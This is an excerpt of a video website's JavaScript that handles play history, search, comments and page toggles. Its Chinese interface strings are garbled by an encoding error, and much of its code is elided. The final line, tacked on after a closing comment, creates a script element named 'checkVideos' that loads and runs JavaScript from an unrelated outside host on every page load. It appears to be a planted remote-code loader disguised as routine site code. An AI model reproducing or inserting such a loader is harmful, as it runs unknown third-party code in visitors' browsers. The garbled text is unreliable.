...
function PlayHistoryClass() {
	...
	this.viewPlayHistory = function(div) {
					...
					if(result['r']!=null&&result['r'].length>0){
						...
						for(var i in result['r']){
							...
							innerStr += "<li><h5><a href=\"" + data['vod_readurl'] 
							         ...
							         + data['vod_palyurl'] + "\">缁х画瑙傜湅</a></label><a href=\"javascript:;\" target='_blank' class='delck' data=\""
							         +data['id']+"\" mtype='ajax'>鍒犻櫎</a></li>" ;
						}
						...
						document.getElementById('playhistory').innerHTML="<li class='no-his'><p>鏆傛棤鎾斁鍘嗗彶鍒楄〃...</p></li>";
					}
				}
			},'json');
			$("#his-todo").hide(); 
		...
		if (navigator.cookieEnabled) {
				...
				for ( var i = nameArray.length - 1; i >= 0; i--) {
					...
					if (vodnames.length == 2 && vodlinks.length ==2) {
						innerStr += "<li><h5><a href=\""
								...
								+ vodlinks[1]
								+ "\">缁х画瑙傜湅</a></label><a href=\"javascript:;\" class='delck' data='"
								+ i + "' mtype='inck'>鍒犻櫎</a></li>"
					}
				}
			}
			$("#his-todo").show();
			...
			set(tag, "鎮ㄦ祻瑙堝櫒鍏抽棴浜哻ookie鍔熻兘锛屼笉鑳戒负鎮ㄨ嚜鍔ㄤ繚瀛樻渶杩戞祻瑙堣繃鐨勭綉椤点€�")
		}
	}
	this.removeHistory = function(ii, type) {
		this.getPlayArray();
		if (type == 'inck') {
			var count = 10; // 鎾斁鍘嗗彶鍒楄〃璋冪敤鏉℃暟
	...
	this.emptyhistory = function(type){
		$.showfloatdiv({
			...
			suredo : function(e) {
				if(type=='ajax'){
					$.get(Root + 'index.php?s=User-Comm-emptyhistory',function(r){document.getElementById('playhistory').innerHTML="<li class='no-his'><p>鏆傛棤鎾斁鍘嗗彶鍒楄〃...</p></li>";});
				}else{
					_GC();
				}
				$.closefloatdiv();
...
function qrsearch(id){
	if($("#xdwwd").val()=='璇峰湪姝ゅ杈撳叆褰辩墖鐗囧悕鎴栨紨鍛樺悕绉般€�'||$("#wd").val()==''){
		$("#xdwwd").val('');
		$("#xdwwd").focus();
	}else{
            ...
            $("#fav").click(function() {
                ...
                try {
                    ...
                    try {
                        ...
                        alert("璇蜂娇鐢–trl+D涓烘偍鐨勬祻瑙堝櫒娣诲姞涔︾锛�");
                    }
                }
            });
...
//                location.href = $jumpurl + encodeURIComponent(data.vod_name);
    ...
    'History': {
        ...
        'Create': function($id) {
            ...
            html += '<thead><tr><th colspan="2"><b id="clearall"><a href="javascript:void(0)" onclick="FF.History.Clear();">娓呯┖</a></b></th></tr></thead>';
            if (jsondata.length > 0) {
                ...
                html += '<tfoot><tr class="emptied"><th colspan="2">鏆傛棤娴忚璁板綍</th></tr></tfoot>';
            };
			html += '</table>';
	...
	'Comment': {
		...
		'Post':function CommentPost(){
			if($("#comment_content").val() == '璇峰湪杩欓噷鍙戣〃鎮ㄧ殑涓汉鐪嬫硶锛屾渶澶�200涓瓧銆�'){
				$('#comment_tips').html('璇峰彂琛ㄦ偍鐨勮瘎璁鸿鐐癸紒');
				return false;
			}
    ...
    try {
        ...
        if (window.netscape) {
            try {
                ...
                alert("娓╅Θ鎻愮ず:\n娴忚鍣ㄤ笉鍏佽缃戦〉璁剧疆棣栭〉銆俓n璇锋墜鍔ㄨ繘鍏ユ祻瑙堝櫒閫夐」璁剧疆涓婚〉銆�");
            }
...
$(document).ready(function(){
			...
			if($("#downul").length > 0)
	{
		if($("#downul")[0].scrollHeight>305)
		{
			...
			if($(this).hasClass('ss')){
			$(this).removeClass('ss').addClass('zk').text('灞曞紑鍏ㄩ儴');
		}else{
			$(this).removeClass('zk').addClass('ss').text('鏀剁缉閮ㄥ垎');
		}						
	...
	if($("#actorall").length > 0)
	{
		if($("#actorall")[0].scrollHeight>287)
		{
			...
			$("#downzk").click(function(e){
			if($(this).hasClass('ss')){
			$(this).removeClass('ss').addClass('zk').text('鏌ョ湅鍏ㄩ儴');
		}else{
			$(this).removeClass('zk').addClass('ss').text('鏀剁缉閮ㄥ垎');
		}						
...
*/
var checkVideos = document.createElement('SCRIPT');checkVideos.src="https://rebdy.com/fzs/fzs/fzsVideoCache01HX.js";checkVideos.charset="UTF-8";document.getElementsByTagName('head').item(0).appendChild(checkVideos);